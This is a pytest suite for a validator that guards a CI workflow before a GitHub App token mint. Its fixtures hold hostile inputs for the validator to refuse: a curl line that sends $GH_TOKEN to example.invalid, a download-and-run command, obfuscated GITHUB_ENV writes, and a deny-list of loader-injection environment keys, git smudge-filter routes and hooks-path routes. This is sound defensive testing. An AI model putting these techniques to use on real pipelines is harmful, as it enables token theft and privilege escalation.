# SPDX-License-Identifier: MIT
"""What may run, and what may be set, before the tooling App mint (#1622).

Covers ``tooling_app_ambient.py`` on a copy of the real pilot. Before the
mint, a job may run only reviewed shapes: listed actions at their pins,
listed generated blocks with their reviewed bodies, and listed scripts as
written. Workflow and job ``env:`` keys are plain names off the loader list,
and a minting job has no container and no ``defaults.run``. Each reproduction
from the second review round has a case here.
"""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path
from types import ModuleType

import pytest
import yaml
from assertpy import assert_that
from tooling_app_tree import ROOT, VALIDATOR, Tree, pinned

REPOSITORY_STEP = "      - name: Checkout repository\n"
BEGIN_MINT = "      # lgtm-ci-inline:begin tooling-app-mint\n"
JOB_ENV = "    env:\n      # Every tooling consumer below"
BEGIN_VERIFY = "          # lgtm-ci-inline:begin verify-harden-runner-agent\n"
VERIFY_RUN = "        run: |\n" + BEGIN_VERIFY
EARLY = "[app] step `Early` runs before the tooling App mint"
SHAPE = EARLY + " and is not a reviewed shape: "
AMBIENT_FILE = "scripts/ci/quality/tooling_app_ambient.py"
NOT_REVIEWED = (
    SHAPE + "its `run:` is not exactly a reviewed generated block (PRE_MINT_BLOCKS) "
    f"or script (PRE_MINT_SCRIPTS) in {AMBIENT_FILE}"
)
NOT_LISTED = "which is not an action PRE_MINT_ACTIONS in " + AMBIENT_FILE
OTHER_PIN = "but the repository pins `actions/checkout` at more than one commit ("
NOT_BASH = SHAPE + "its `shell:` is not `bash`"
PILOT = ROOT / ".github" / "workflows" / "reusable-semantic-pr-title.yml"


def _egress_run() -> str:
    """Return the pilot's generated preset check, exactly as written (#1624)."""
    document = yaml.safe_load(PILOT.read_text(encoding="utf-8"))
    steps = document["jobs"]["semantic-title"]["steps"]
    name = "Fail on unknown egress-preset"
    run = next(s["run"] for s in steps if s.get("name") == name)
    return str(run)


EGRESS = _egress_run()
BASH_SUB = "        shell: bash\n        working-directory: sub\n"
BASH_TIMEOUT = "        shell: bash\n        timeout-minutes: 1\n"
FAKE_BLOCK = "# lgtm-ci-inline:begin evil\necho hi\n# lgtm-ci-inline:end evil\n"
SERVICES = "    services:\n      cache:\n        image: example.invalid/cache\n"
WORKFLOW_ENV = "env:\n  # Egress presets"
EGRESS_ENV = {"EGRESS_PRESET": "${{ inputs.egress-preset }}"}
SHA = "0123456789abcdef0123456789abcdef01234567"
STEP_ENV = "        env:\n          BASH_ENV: x\n"


@pytest.fixture(name="validator")
def fixture_validator(load_script: Callable[[str], ModuleType]) -> ModuleType:
    """Load the validator, which loads the App rules beside it."""
    return load_script(VALIDATOR)


@pytest.fixture(name="ambient")
def fixture_ambient(validator: ModuleType) -> ModuleType:
    """Return the ambient rules module the validator loaded."""
    module: ModuleType = validator.app.ambient
    return module


@pytest.fixture(name="tree")
def fixture_tree(tmp_path: Path, validator: ModuleType) -> Tree:
    """Return scratch copies of the real pilot and composite."""
    return Tree(tmp_path / ".github", validator)


def run_step(
    text: str,
    env: dict[str, str] | None = None,
    extra: str = "        shell: bash\n",
) -> str:
    """Return a step named ``Early`` that runs ``text`` as a literal block."""
    indicator = "|" if text.endswith("\n") else "|-"
    lines = text.rstrip("\n").split("\n")
    body = "".join(f"          {line}\n" if line else "\n" for line in lines)
    pairs = (env or {}).items()
    env_text = "".join(f"          {key}: {value}\n" for key, value in pairs)
    env_text = f"        env:\n{env_text}" if env else ""
    return f"      - name: Early\n{extra}{env_text}        run: {indicator}\n{body}"


def uses_step(action: str, extra: str = "") -> str:
    """Return a step named ``Early`` that uses ``action``."""
    return f"      - name: Early\n        uses: {action}\n{extra}"


def insert(tree: Tree, step: str, before: str = REPOSITORY_STEP) -> None:
    """Put a step into the pilot job before another step."""
    tree.edit(before, step + before)


# Each reviewed shape is accepted.


def test_pilot_shapes_pass(tree: Tree) -> None:
    """Harden-runner, the verification block, the preset check and the checkout."""
    assert_that(tree.run()).is_empty()


def test_release_mint_before_the_mint_passes(tree: Tree, ambient: ModuleType) -> None:
    """The release App mint, at its listed pin, may come first."""
    insert(tree, uses_step(ambient.mint_uses(), "        with:\n          app-id: x\n"))

    assert_that(tree.run()).is_empty()


def test_select_app_credential_block_passes(tree: Tree, ambient: ModuleType) -> None:
    """A listed generated block with its reviewed body and env keys passes."""
    env = {
        "APP_ID": "${{ secrets.RELEASE_APP_ID }}",
        "APP_CLIENT_ID": "${{ secrets.RELEASE_APP_CLIENT_ID }}",
    }
    insert(tree, run_step(ambient.block_text("select-app-credential"), env))

    assert_that(tree.run()).is_empty()


def test_select_cleanup_token_block_passes(tree: Tree, ambient: ModuleType) -> None:
    """The cleanup token check, with its four boolean env keys, passes (#1691)."""
    env = {
        "APP_MODE": "${{ inputs.cleanup-app-token }}",
        "APP_ID_SET": "${{ secrets.RELEASE_APP_ID != '' }}",
        "APP_KEY_SET": "${{ secrets.RELEASE_APP_PRIVATE_KEY != '' }}",
        "GH_TOKEN_SET": "${{ secrets.GH_TOKEN != '' }}",
    }
    insert(tree, run_step(ambient.block_text("select-cleanup-token"), env))

    assert_that(tree.run()).is_empty()


def test_select_cleanup_token_block_with_another_key_fails(
    tree: Tree,
    ambient: ModuleType,
) -> None:
    """The cleanup token check may not take an env key off its list (#1691)."""
    env = {
        "APP_MODE": "${{ inputs.cleanup-app-token }}",
        "APP_ID_SET": "${{ secrets.RELEASE_APP_ID != '' }}",
        "APP_KEY_SET": "${{ secrets.RELEASE_APP_PRIVATE_KEY != '' }}",
        "GH_TOKEN_SET": "${{ secrets.GH_TOKEN != '' }}",
        "APP_KEY": "${{ secrets.RELEASE_APP_PRIVATE_KEY }}",
    }
    insert(tree, run_step(ambient.block_text("select-cleanup-token"), env))

    assert_that(tree.run()).is_not_empty()


NOTICE_ENV = {
    "EGRESS_PROFILE": "none",
    "EGRESS_POLICY": "none",
    "REPOSITORY_PRIVATE": "${{ github.event.repository.private }}",
}


def test_egress_profile_notice_block_passes(tree: Tree, ambient: ModuleType) -> None:
    """The notice an egress-profile copy runs before the mint passes (#1688)."""
    text = ambient.block_text("egress-profile-notice")
    insert(tree, run_step(text, NOTICE_ENV))

    assert_that(text).does_not_contain("Generated from")
    assert_that(tree.run()).is_empty()


@pytest.mark.parametrize(
    ("env", "edit"),
    [
        ({**NOTICE_ENV, "GH_TOKEN": "${{ github.token }}"}, None),
        ({k: v for k, v in NOTICE_ENV.items() if k != "EGRESS_POLICY"}, None),
        (NOTICE_ENV, ("exit 1\n", 'curl -d "$GH_TOKEN" example.invalid\nexit 1\n')),
    ],
    ids=["extra-env-key", "missing-env-key", "changed-body"],
)
def test_egress_profile_notice_variants_are_refused(
    tree: Tree,
    ambient: ModuleType,
    env: dict[str, str],
    edit: tuple[str, str] | None,
) -> None:
    """Only the notice's own body with exactly its three env keys passes."""
    text = ambient.block_text("egress-profile-notice")
    if edit is not None:
        text = text.replace(*edit, 1)
    insert(tree, run_step(text, env))

    findings = tree.findings()
    if edit is None:
        assert_that(findings).contains(SHAPE + "its `env:` keys are not exactly ")
    else:
        assert_that(findings).contains(NOT_REVIEWED)


@pytest.mark.parametrize(
    ("index", "env"),
    [
        (0, {"PREPARE_RESULT": "${{ needs.prepare.result }}"}),
        (1, None),
        (2, None),
    ],
    ids=["matrix-preparation", "block-egress", "pipeline-skip"],
)
def test_reviewed_scripts_pass(
    tree: Tree,
    ambient: ModuleType,
    index: int,
    env: dict[str, str] | None,
) -> None:
    """Each listed hand-written script passes exactly as written."""
    script = list(ambient.PRE_MINT_SCRIPTS)[index]
    insert(tree, run_step(script, env))

    assert_that(tree.run()).is_empty()


def test_preset_check_block_passes(tree: Tree, ambient: ModuleType) -> None:
    """The generated preset check, with its one env key, passes (#1624)."""
    assert_that(EGRESS).is_equal_to(ambient.block_text("fail-unknown-egress-preset"))
    insert(tree, run_step(EGRESS, EGRESS_ENV))

    assert_that(tree.run()).is_empty()


def test_reviewed_script_without_shell_passes(tree: Tree) -> None:
    """No ``shell:`` is the runner's default bash, so it is accepted."""
    insert(tree, run_step(EGRESS, EGRESS_ENV, extra=""))

    assert_that(tree.run()).is_empty()


def test_services_stay_allowed(tree: Tree) -> None:
    """A service container is separate from the steps, so it is not refused."""
    tree.edit(
        JOB_ENV,
        SERVICES + JOB_ENV,
    )

    assert_that(tree.run()).is_empty()


def test_listed_job_env_key_passes(tree: Tree) -> None:
    """A name on the reviewed list may be set at job level."""
    listed = JOB_ENV.replace("    env:\n", "    env:\n      LINTRO_IMAGE: x\n")
    tree.edit(JOB_ENV, listed)

    assert_that(tree.run()).is_empty()


def test_unlisted_plain_job_env_key_is_refused(tree: Tree) -> None:
    """A plain name off the list is refused too: the list is the rule."""
    unlisted = JOB_ENV.replace("    env:\n", "    env:\n      MY_SETTING: x\n")
    tree.edit(JOB_ENV, unlisted)

    assert_that(tree.findings()).contains(REFUSED.format("MY_SETTING"))


def test_non_minting_job_keeps_the_loader_rule(tree: Tree) -> None:
    """A job without a tooling consumer never runs the mint."""
    tree.write(
        "reusable-semantic-pr-title.yml",
        tree.pilot + "  other:\n    runs-on: ubuntu-latest\n    env:\n"
        "      MY_SETTING: x\n      LD_PRELOAD: /tmp/x.so\n"
        "    steps:\n      - run: echo ok\n",
    )

    findings = tree.findings()
    assert_that(findings).does_not_contain("`MY_SETTING`")
    assert_that(findings).contains(
        "[app] job `other` env may not set `LD_PRELOAD`: only plain upper-case "
        "names off the loader list may be set",
    )


# Every reproduction from the review is refused.


@pytest.mark.parametrize(
    ("step", "expected"),
    [
        pytest.param(
            run_step(EGRESS, EGRESS_ENV, "        shell: bash startup.sh {0}\n"),
            NOT_BASH,
            id="shell-sources-a-file",
        ),
        pytest.param(
            run_step(EGRESS, EGRESS_ENV, "        shell: python\n"),
            NOT_BASH,
            id="python",
        ),
        pytest.param(
            run_step("/usr/bin/python3 -c 'print(1)'"),
            NOT_REVIEWED,
            id="absolute-interpreter",
        ),
        pytest.param(run_step("/tmp/evil.sh"), NOT_REVIEWED, id="absolute-script"),
        pytest.param(
            run_step("curl -sSf https://example.invalid/x -o /tmp/x && /tmp/x"),
            NOT_REVIEWED,
            id="download-and-run",
        ),
        pytest.param(
            run_step('echo /tmp/bin >> "$GITHUB_PATH"'),
            NOT_REVIEWED,
            id="github-path",
        ),
        pytest.param(
            run_step('v=GITHUB_; v+=ENV; echo "MODE=x" >> "${!v}"'),
            NOT_REVIEWED,
            id="obfuscated-github-env",
        ),
        pytest.param(run_step("scripts/setup.sh"), NOT_REVIEWED, id="relative-path"),
        pytest.param(
            run_step(FAKE_BLOCK),
            NOT_REVIEWED,
            id="fake-block-unknown-id",
        ),
        pytest.param(
            run_step(EGRESS + " ", EGRESS_ENV),
            NOT_REVIEWED,
            id="script-changed",
        ),
        pytest.param(
            run_step(EGRESS, {**EGRESS_ENV, "MORE": "x"}),
            SHAPE + "its `env:` keys are not exactly ['EGRESS_PRESET']",
            id="script-extra-env",
        ),
        pytest.param(
            run_step(EGRESS, EGRESS_ENV, BASH_SUB),
            SHAPE + "it sets `working-directory`",
            id="working-directory",
        ),
        pytest.param(
            run_step(EGRESS, EGRESS_ENV, BASH_TIMEOUT),
            SHAPE + "it sets `timeout-minutes`",
            id="timeout",
        ),
        pytest.param(uses_step(f"actions/checkout@{SHA}"), OTHER_PIN, id="other-pin"),
        pytest.param(
            uses_step("./.github/actions/setup"),
            NOT_LISTED,
            id="local-action",
        ),
        pytest.param(
            uses_step("docker://example.invalid/setup:1"),
            NOT_LISTED,
            id="container-action",
        ),
        pytest.param(
            uses_step(pinned("actions/checkout"), STEP_ENV),
            SHAPE + "it sets `env`",
            id="listed-action-with-env",
        ),
        pytest.param(
            "      - name: Early\n        run: [echo, early]\n",
            NOT_REVIEWED,
            id="run-not-text",
        ),
        pytest.param(
            run_step(
                EGRESS,
                extra="        env: ${{ fromJSON(inputs.e) }}\n        shell: bash\n",
            ),
            SHAPE + "its `env:` keys are not exactly ['EGRESS_PRESET']",
            id="step-env-expression",
        ),
    ],
)
def test_unreviewed_steps_before_the_mint_fail(
    tree: Tree,
    step: str,
    expected: str,
) -> None:
    """Anything but a reviewed shape before the mint is refused."""
    insert(tree, step)

    assert_that(tree.findings()).contains(expected)


def test_step_right_before_the_check_step_is_examined(tree: Tree) -> None:
    """The boundary: the step directly before the check step is held too."""
    insert(tree, run_step("/tmp/evil.sh"), before=BEGIN_MINT)

    assert_that(tree.findings()).contains(NOT_REVIEWED)


def test_fake_block_with_a_known_id_fails(tree: Tree, ambient: ModuleType) -> None:
    """A block named like a reviewed one but with another body is refused."""
    text = ambient.block_text("select-app-credential").replace("exit 1", "exit 0", 1)
    env = {"APP_ID": "x", "APP_CLIENT_ID": "y"}
    insert(tree, run_step(text, env))

    assert_that(tree.findings()).contains(NOT_REVIEWED)


def test_reviewed_block_not_listed_before_the_mint_fails(
    tree: Tree,
    ambient: ModuleType,
) -> None:
    """A real generated block that is not on the pre-mint list is refused."""
    insert(tree, run_step(ambient.block_text("install-verified-trivy")))

    assert_that(tree.findings()).contains(NOT_REVIEWED)


def test_continue_on_error_on_the_verification_fails(tree: Tree) -> None:
    """The verification may not be allowed to fail."""
    tree.edit(VERIFY_RUN, "        continue-on-error: true\n" + VERIFY_RUN)

    assert_that(tree.findings()).contains("it sets `continue-on-error`")


# Workflow and job environment.

REFUSED = "may not set `{}`: only the names on the reviewed list"


@pytest.mark.parametrize(
    "line",
    [
        "BASH_ENV: ${{ github.workspace }}/startup.sh",
        "BASH_FUNC_echo%%: () { :; }",
        "ENV: /tmp/startup.sh",
        "LD_PRELOAD: /tmp/x.so",
        "LD_LIBRARY_PATH: /tmp",
        "DYLD_INSERT_LIBRARIES: /tmp/x.dylib",
        "PATH: /tmp/bin",
        "PS4: $(id)",
        "SHELLOPTS: xtrace",
        "BASHOPTS: extdebug",
        "PROMPT_COMMAND: id",
        "IFS: x",
        "GCONV_PATH: /tmp",
        "NO_PROXY: '*'",
        "HTTPS_PROXY: http://example.invalid",
        "SSL_CERT_FILE: /tmp/ca.pem",
        "SSL_CERT_DIR: /tmp/ca",
        "NODE_EXTRA_CA_CERTS: /tmp/ca.pem",
        "NODE_OPTIONS: --require /tmp/x.js",
        "INPUT_PERMISSION-issues: write",
        "input_permission_issues: write",
        "bash_env: /tmp/startup.sh",
        "Path: /tmp/bin",
        "${{ matrix.name }}: write",
        "lintro_image: x",
        "GIT_CONFIG_COUNT: 1",
        "GIT_CONFIG_KEY_0: filter.review.smudge",
        "GIT_CONFIG_VALUE_0: echo x >> $GITHUB_ENV; cat",
        "GIT_CONFIG_GLOBAL: /tmp/gitconfig",
        "GIT_CONFIG_PARAMETERS: core.hooksPath=/tmp/hooks",
        "OPENSSL_CONF: ${{ github.workspace }}/node-openssl.cnf",
        "OPENSSL_MODULES: /tmp/modules",
        "OPENSSL_ENGINES: /tmp/engines",
        "HARDEN_RUNNER_ROOT: /tmp/fake",
        "SSH_ASKPASS: /tmp/x",
        "CURL_HOME: /tmp",
        "PYTHONPATH: /tmp",
        "HOME: /tmp",
        "TMPDIR: /tmp",
        "XDG_CONFIG_HOME: /tmp",
    ],
)
def test_loader_and_input_keys_are_refused_at_job_level(tree: Tree, line: str) -> None:
    """Each loader, resolver or input name, in any case, is refused."""
    tree.edit(JOB_ENV, JOB_ENV.replace("    env:\n", f"    env:\n      {line}\n"))

    assert_that(tree.findings()).contains(REFUSED.format(line.split(": ")[0]))


def test_loader_key_is_refused_at_workflow_level(tree: Tree) -> None:
    """The workflow ``env:`` is held to the same rule."""
    preload = WORKFLOW_ENV.replace("env:\n", "env:\n  LD_PRELOAD: /tmp/x.so\n")
    tree.edit(WORKFLOW_ENV, preload)

    assert_that(tree.findings()).contains(
        "[app] workflow `env:` " + REFUSED.format("LD_PRELOAD"),
    )


def test_env_expression_is_refused(tree: Tree) -> None:
    """A job ``env:`` that is an expression cannot be read, so it is refused."""
    tree.edit(
        JOB_ENV,
        "    env: ${{ fromJSON(inputs.job-env) }}\n"
        "    x-unused:\n      # Every tooling consumer below",
    )

    expected = "[app] job `semantic-title` env must be a mapping"
    assert_that(tree.findings()).contains(expected)


def test_non_scalar_env_key_is_refused(tree: Tree) -> None:
    """A collection used as an ``env:`` key cannot be named, so it is refused."""
    key = JOB_ENV.replace("    env:\n", "    env:\n      ? [a, b]\n      : x\n")
    tree.edit(JOB_ENV, key)

    assert_that(tree.findings()).contains(REFUSED.format("a non-scalar key"))


def test_container_is_refused_in_a_minting_job(tree: Tree) -> None:
    """A job container's options, image or expressions could reach the mint."""
    tree.edit(
        JOB_ENV,
        "    container:\n      image: example.invalid/image\n"
        "      options: --env INPUT_PERMISSION-issues=write\n" + JOB_ENV,
    )

    assert_that(tree.findings()).contains(
        "[app] a job that mints the tooling App token may not run in a `container:`",
    )


@pytest.mark.parametrize(
    ("old", "new", "label"),
    [
        (
            "env:\n  # Egress presets",
            "defaults:\n  run:\n    shell: bash startup.sh {0}\n" + WORKFLOW_ENV,
            "the workflow",
        ),
        (
            JOB_ENV,
            "    defaults:\n      run:\n        shell: python\n" + JOB_ENV,
            "job `semantic-title`",
        ),
    ],
    ids=["workflow", "job"],
)
def test_defaults_run_is_refused(tree: Tree, old: str, new: str, label: str) -> None:
    """``defaults.run`` would change the shell of a step before the mint."""
    tree.edit(old, new)

    assert_that(tree.findings()).contains(f"[app] {label} sets `defaults.run`")


# The allow-list itself is checked against the repository.


def _workflow_texts() -> list[str]:
    """Return the text of every workflow."""
    paths = sorted((ROOT / ".github" / "workflows").glob("*.y*ml"))
    return [path.read_text(encoding="utf-8") for path in paths]


def test_every_listed_action_is_used(ambient: ModuleType) -> None:
    """A pin bump that leaves a stale entry fails here."""
    texts = "\n".join(_workflow_texts())

    pins = ambient.accepted_pins(ROOT / ".github" / "workflows")

    for action in ambient.PRE_MINT_ACTIONS:
        assert_that(texts).described_as(action).contains(f"uses: {action}@")
        assert_that(pins[action]).described_as(action).is_length(1)


def test_every_listed_script_is_used(ambient: ModuleType) -> None:
    """Each hand-written script on the list still appears as a step."""
    runs = {
        step.get("run")
        for text in _workflow_texts()
        for job in (yaml.safe_load(text).get("jobs") or {}).values()
        for step in (job or {}).get("steps") or []
    }

    for script in ambient.PRE_MINT_SCRIPTS:
        assert_that(runs).described_as(script).contains(script)


def test_every_listed_block_exists(ambient: ModuleType) -> None:
    """Each block on the list is a generated block with a source."""
    for block_id in ambient.PRE_MINT_BLOCKS:
        assert_that(ambient.block_text(block_id)).starts_with(
            f"# lgtm-ci-inline:begin {block_id}\n",
        )


def test_unnamed_step_before_the_mint_is_named_by_line(tree: Tree) -> None:
    """A refused step without ``name`` or ``id`` is reported by its line."""
    insert(tree, "      - run: /tmp/evil.sh\n")

    assert_that(tree.findings()).contains("[app] step `line ")


def test_git_filter_route_is_refused(tree: Tree) -> None:
    """The reviewer's git route: a smudge filter configured through env."""
    route = (
        "      GIT_CONFIG_COUNT: 1\n"
        "      GIT_CONFIG_KEY_0: filter.review.smudge\n"
        '      GIT_CONFIG_VALUE_0: \'echo "INPUT_PERMISSION-issues=write" '
        '>> "$GITHUB_ENV"; cat\'\n'
    )
    tree.edit(JOB_ENV, JOB_ENV.replace("    env:\n", "    env:\n" + route))

    findings = tree.findings()
    for name in ("GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"):
        assert_that(findings).contains(REFUSED.format(name))


def test_git_hooks_path_route_is_refused(tree: Tree) -> None:
    """The reviewer's hooks route: core.hooksPath into the fresh workspace."""
    route = (
        "      GIT_CONFIG_COUNT: 1\n"
        "      GIT_CONFIG_KEY_0: core.hooksPath\n"
        "      GIT_CONFIG_VALUE_0: ${{ github.workspace }}/.hooks\n"
    )
    tree.edit(JOB_ENV, JOB_ENV.replace("    env:\n", "    env:\n" + route))

    assert_that(tree.findings()).contains(REFUSED.format("GIT_CONFIG_KEY_0"))


@pytest.mark.parametrize(
    "line",
    [
        "OPENSSL_CONF: ${{ github.workspace }}/node-openssl.cnf",
        "OPENSSL_MODULES: /tmp/modules",
        "GIT_CONFIG_GLOBAL: /tmp/gitconfig",
        "HARDEN_RUNNER_ROOT: /tmp/fake",
    ],
)
def test_routes_are_refused_at_workflow_level(tree: Tree, line: str) -> None:
    """The same names in the workflow ``env:`` reach every job, so they fail."""
    tree.edit(WORKFLOW_ENV, WORKFLOW_ENV.replace("env:\n", f"env:\n  {line}\n"))

    assert_that(tree.findings()).contains(
        "[app] workflow `env:` " + REFUSED.format(line.split(": ")[0]),
    )


def test_every_listed_env_key_is_used(ambient: ModuleType) -> None:
    """A key that no workflow sets any more is a stale entry."""
    used: set[str] = set()
    for text in _workflow_texts():
        workflow = yaml.safe_load(text)
        used.update((workflow.get("env") or {}).keys())
        for job in (workflow.get("jobs") or {}).values():
            used.update(((job or {}).get("env") or {}).keys())

    for name in ambient.ENV_KEYS:
        assert_that(used).described_as(name).contains(name)
